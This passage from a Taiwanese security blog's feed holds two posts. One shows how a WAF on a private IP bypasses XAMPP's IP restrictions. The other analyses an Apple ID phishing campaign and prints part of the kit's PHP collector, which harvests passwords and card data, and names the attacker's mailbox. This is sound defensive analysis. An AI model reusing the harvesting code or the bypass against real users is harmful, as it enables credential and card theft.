 </entry>
 
 <entry>
   <title>設備不良設定帶來的安全風險：以 WAF 為例</title>
   <link href="http://devco.re/blog/2014/07/18/waf-configuration-security-issue/"/>
   <updated>2014-07-18T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/07/18/waf-configuration-security-issue</id>
   <content type="html">
&lt;p&gt;&lt;img src=&quot;https://farm7.staticflickr.com/6155/6183500441_5de4a999eb_z.jpg&quot; alt=&quot;Firewall&quot; /&gt;
&lt;!-- Credit: https://www.flickr.com/photos/briannabites/6183500441/ --&gt;&lt;/p&gt;

&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;

&lt;p&gt;有了 WAF 就是萬靈丹了嗎？就算有各種資安設備，但缺乏安全的設定，有的時候反而會讓系統陷入安全風險中。我們就以 Reverse Proxy 或 WAF 設備來探討不佳設定帶來的安全風險。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-&quot;&gt;WAF 搭配不佳的設定會帶來什麼危害？&lt;/h3&gt;

&lt;p&gt;以常見的 mod_proxy 搭配 mod_security 的方案來看，通常使用 Reverse Proxy 或 Transparent Proxy 為其架構，透過 Proxy 的方式在 Client 與 Web Server 之間，對 HTTP Request / Response 進行過濾；以 HTTP Request 為例，當 WAF 偵測到 Client 端的請求中有 SQL Injection 語法時候，將會阻斷這個連線防止駭客攻擊。&lt;/p&gt;

&lt;p&gt;在這種架構下的 WAF 看似對後端的伺服器多了一份保障，但也並非完美。其問題是後端的 Web Server 在透過 WAF 存取的情況下，無法得知來自 Client 端的來源 IP，相反的 Web Server 能看到的 IP 都將是 WAF 的 IP (REMOTE ADDR)，在這種情況下可能造成 Client 端可以存取受 IP 來源限制的系統。延伸閱讀：&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;如何正確的取得使用者 IP？&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;以下圖為例，網站本身只允許 192.168.x.x 的網段連線，如果今天 Client IP 是 1.1.1.1，將無法存取該網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-83jVqsSvAXA/U8jvgKw26VI/AAAAAAAAAjU/J_ss99PvApw/s2560/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-83jVqsSvAXA/U8jvgKw26VI/AAAAAAAAAjU/J_ss99PvApw/w566-h150-no/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;限制 IP 存取&quot; title=&quot;限制 IP 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但在有建置 WAF 的架構之下，Client 透過 WAF 存取網站，網站得到的 IP 會是 WAF 的 IP：192.168.1.10，因此允許連線，Client 因而取得原本需在內網才能存取的資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hlQZaYZcEZE/U8jvhb5DHoI/AAAAAAAAAjw/jb2tUe10cl8/s2560/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hlQZaYZcEZE/U8jvhb5DHoI/AAAAAAAAAjw/jb2tUe10cl8/w784-h233-no/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;因為 WAF 而繞過 IP 限制&quot; title=&quot;因為 WAF 而繞過 IP 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;我們以常見的 Web Server 整合包 XAMPP 為例，在預設的 http-xampp.conf 設定檔中限制了一些管理頁面只能由 Private IP 存取，如 /security 、 /webalizer 、 /phpmyadmin 、 /server-status 、 /server-info 等，此時 WAF 的 IP 若為 Private IP，依 XAMPP 預設設定，WAF 將可以存取這些受 IP 限制的資源，當 WAF 存取完資源後又將內容回傳給 Client 端。&lt;/p&gt;

&lt;p&gt;http-xampp.conf 預設設定&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;LocationMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nb&quot;&gt;Deny&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from ::1 &lt;span class=&quot;m&quot;&gt;127.0.0.0/8&lt;/span&gt; \
                &lt;span class=&quot;err&quot;&gt;fc00::/7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/8&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;172&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;16&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/12&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;192&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;168&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;
                &lt;span class=&quot;err&quot;&gt;fe80::/10&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;169&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;254&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt;
         &lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;403&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/error/XAMPP_FORBIDDEN.html.var&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LocationMatch&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果照著預設的設定，以現成的案例來看，能夠存取 Apache Server 的系統狀態，其中可以看到網站所有連線以及 URI 等資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-EO9Rkiws9UI/U8jvhN47OoI/AAAAAAAAAj0/huRQZAHBaWM/s2560/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-EO9Rkiws9UI/U8jvhN47OoI/AAAAAAAAAj0/huRQZAHBaWM/w827-h678-no/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;預設開放 Apache 伺服器狀態&quot; title=&quot;預設開放 Apache 伺服器狀態&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;並且可以直接讀取 phpMyAdmin 介面，並且至資料庫中新增、修改、刪除資料，甚至直接上傳 webshell 進入主機。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-qLCILB4qbsI/U8jvhvJxMHI/AAAAAAAAAkQ/JrGBK7N2SgQ/s2560/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-qLCILB4qbsI/U8jvhvJxMHI/AAAAAAAAAkQ/JrGBK7N2SgQ/w860-h678-no/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;直接進入 phpMyAdmin 管理介面&quot; title=&quot;直接進入 phpMyAdmin 管理介面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP 也內建了網站記錄分析工具 webalizer，透過這個介面可以知道網站所有進入點的流量、統計數據等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-22UDz3CWOzw/U8jvig8XCfI/AAAAAAAAAkM/JlDEr1YQXL4/s2560/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-22UDz3CWOzw/U8jvig8XCfI/AAAAAAAAAkM/JlDEr1YQXL4/w860-h678-no/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;網站記錄分析工具 webalizer&quot; title=&quot;網站記錄分析工具 webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;如果建置了 WAF，有關 IP 的設定必須要從 WAF 支援的 HTTP Header 中取出使用者的 IP (REMOTE_ADDR)，才能讓原本網站的 IP 限制生效。在這種設定錯誤或是對 WAF 架構不瞭解的情況下，WAF 反而成為駭客繞過 Private IP 限制的跳板，就如同為駭客開了一個後門。因此在使用資安設備時，必須瞭解其架構。別讓資安設備、安全機制，反而使得伺服器更不安全。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Apple ID 釣魚郵件案例</title>
   <link href="http://devco.re/blog/2014/07/03/apple-id-phishing-scam/"/>
   <updated>2014-07-03T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/07/03/apple-id-phishing-scam</id>
   <content type="html">
&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/s2560/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-r8BU7qq8xt0/U7UTt-3wxxI/AAAAAAAAAh0/y00wjTdq4IE/w678-h440-no/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section&quot;&gt;如何判別釣魚信呢？&lt;/h3&gt;

&lt;p&gt;先來談談要如何判別釣魚信呢。我們可以從四個要素來看：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;標題&lt;/li&gt;
  &lt;li&gt;寄件者&lt;/li&gt;
  &lt;li&gt;內文&lt;/li&gt;
  &lt;li&gt;連結&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;section-1&quot;&gt;標題&lt;/h4&gt;

&lt;p&gt;首先，這封信的標題非常假，一般來說公司不會使用這類標題，這種判斷比較需要經驗。釣魚信件會使用非常聳動、吸引你去做動作的標題。例如常見的「你的帳號遭到停用」、「更換帳號資訊通知」等。點下連結就會帶你去假造的頁面騙你輸入密碼，千萬別傻傻當真。&lt;/p&gt;

&lt;h4 id=&quot;section-2&quot;&gt;寄件者&lt;/h4&gt;

&lt;p&gt;寄件者通常是釣魚信一定會加強假造的部分，利用官方存在的信箱或是他人的信箱寄信，加強你的信任。不過需要特別注意的是：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;寄件者的欄位是可以假造、隨意填寫的，千萬不要直接信任。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;以這封信為例，寄件者「service@apple.com」是不存在的。當然這個欄位可以假造，但連假造都錯，實在是非常不用心。&lt;/p&gt;

&lt;h4 id=&quot;section-3&quot;&gt;內文&lt;/h4&gt;

&lt;p&gt;信件的內文就是精華了，要怎麼做出一封很像官方的信件，又要誘使人去點選，實在是一門藝術。精心設計的釣魚信、社交工程、APT 郵件，通常都會針對受害者客製化，調查身邊的社交圈、常談的話題、常用的服務、會點擊的郵件，來製造一個一定會中獎的信件。&lt;/p&gt;

&lt;p&gt;當然很多時候攻擊者調查不足，還是會出現蛛絲馬跡的。例如來自中國的惡意郵件，常會出現「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」這種在台灣人眼中看了很彆扭的詞彙。如果出現了不常見的用詞，就非常有可能是一個假造的惡意郵件，千萬不要傻傻的點選連結或附件。&lt;/p&gt;

&lt;p&gt;再回頭來以這封信為例，最大的破綻除了非制式的內文之外，就屬署名了。明明是假造「Apple Customer Support」的來信，最下面卻簽署「Microsoft Privacy and cookies Developers」，有沒有搞錯？可以再用點心嗎？&lt;/p&gt;

&lt;h4 id=&quot;section-4&quot;&gt;連結&lt;/h4&gt;

&lt;p&gt;最後的重點就是信件中的釣魚連結了，通常這個連結會帶你前往一個長得跟官方網站一模一樣的登入頁面，騙你輸入帳號密碼登入來竊取。在點選超連結之前，一定要先看一下這個連結前往的位置是不是官方的位置，例如是 Apple 的信件通常就會是前往 Apple.com 自己的網域名稱。當然更要特別注意的是假造的網域名稱，例如使用「App1e.com」來偽裝成「Apple.com」，也是非常常見的。&lt;/p&gt;

&lt;p&gt;這封信中使用了最不用心的用法，就是直接拿釣魚網站的 URL 來當連結，一來長得跟官方網域根本不像，二來落落長的連結，到底是想要騙誰點選呢？&lt;/p&gt;

&lt;h3 id=&quot;section-5&quot;&gt;信件標頭藏有攻擊者的蛛絲馬跡&lt;/h3&gt;

&lt;p&gt;收到惡意郵件、釣魚郵件，一定要好好看信件的標頭檔（Header）。裡面通常可以看到攻擊者發信的來源，例如是自己架設的發信伺服器或者是使用肉雞來發信。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/s2560/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-DSvLz6-NiA4/U7UTt5j6t3I/AAAAAAAAAiE/I0iX66vNa0E/w1044-h582-no/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID 釣魚信 Header&quot; title=&quot;Apple ID 釣魚信 Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;信件標頭最重要的就是「Received」這個部分，要由下往上閱讀。從這邊我們可以看到信件的流向，從攻擊發起者到發信伺服器，中間經過其他伺服器的轉送，最後到收到釣魚信件的郵件伺服器。因此從最下面的 Received 位置，我們可以知道攻擊者是從「selecttr@cloud.httpdns.co」來寄送信件的，因此 cloud.httpdns.co 很有可能就是攻擊者的伺服器，或者是被駭來發信的伺服器。&lt;/p&gt;

&lt;p&gt;如果覺得信件的標頭太長難以閱讀，可以利用 Google 提供的工具「&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;」。只要把信件的標頭貼上，他就會自動分析信件的流向，如下圖。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/s2560/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-5Kz28O5Y_QQ/U7UdDqQzuRI/AAAAAAAAAis/nLqhaKijwIc/w962-h403-no/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;檢查信件 header&quot; title=&quot;檢查信件 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-6&quot;&gt;釣魚網頁，也請你注重安全啊。&lt;/h3&gt;

&lt;p&gt;接著我們來看一下釣魚頁面。通常「正常」的釣魚頁面都會做得跟官方一模一樣，因為通常攻擊者都會直接把官方網站上面的 HTML 直接下載下來修改。如果有做得不像的，就真的是太不用心的攻擊者。&lt;/p&gt;

&lt;p&gt;我們可以看到這個釣魚頁面做得非常像，上面要你輸入帳號、密碼、姓名、生日、信用卡號等資訊，非常惡劣。唯有網址實在是太假，希望沒有人眼拙真的以為這是 Apple 的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/s2560/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-roay8gwb1xg/U7UTuUnkDxI/AAAAAAAAAic/Za7ARXd50gE/w897-h678-no/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID 釣魚網頁&quot; title=&quot;Apple ID 釣魚網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;秉持的資安研究員的好習慣，我們把網址子目錄去掉，看看網站的根目錄長什麼樣子，結果讓人跌破眼鏡。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/s2560/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-9othIZ0WnKQ/U7UTt_UVaSI/AAAAAAAAAh4/Wufvr0iIgHI/w897-h678-no/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;釣魚網頁開放目錄瀏覽&quot; title=&quot;釣魚網頁開放目錄瀏覽&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;釣魚網站也請你注重安全啊！&lt;/strong&gt;這個網站大剌剌的開著目錄索引，讓我們可以看到網站上的各個目錄、檔案。除了 Apple 的釣魚網頁之外，甚至有釣魚網頁的原始碼「connect-info.zip」，更有著其他釣魚網頁在同個站上。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/s2560/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-F1tIkSqFbsM/U7UTu8R0Y1I/AAAAAAAAAiQ/5pxB467FPlM/w897-h678-no/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;站上其他釣魚頁面&quot; title=&quot;站上其他釣魚頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;既然可以瀏覽，那我們來看看釣魚網頁的原始碼寫得怎樣。抓下來解開之後會看到完整的釣魚網頁，以及接收受騙人資料的主程式「Snd.php」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/s2560/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-0v_MrZOZf9A/U7UTvO9EgqI/AAAAAAAAAiM/qqW2mrwy500/w706-h574-no/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;下載釣魚網頁原始碼&quot; title=&quot;下載釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;釣魚網頁的程式寫得非常簡單，僅把網頁上接收到的被害人資料、IP，寄送到他的信箱「 justforhacke@gmail.com 」，寄送完畢後會自動導向到官方的頁面偽裝。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/s2560/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-1-GdwVT5nkQ/U7UTvu91imI/AAAAAAAAAiY/VCEV9Eo2oMo/w797-h607-no/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;釣魚網頁原始碼&quot; title=&quot;釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果釣魚網頁寫得不好，甚至我們有機會可以攻擊他釣魚網頁上的漏洞，直接取得主機的權限，解救世人。從原始碼我們一目了然釣魚網頁的行為、寫法，也可以尋找有無攻擊的機會。&lt;/p&gt;

&lt;h4 id=&quot;section-7&quot;&gt;釣魚網頁原始碼備份&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple ID                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee000&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Password                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee001&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Full Name                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee01&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Date of Birth               : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee02&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee3&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee4&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Number Of Credit Card       : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;CVC (CVV)                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee6&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
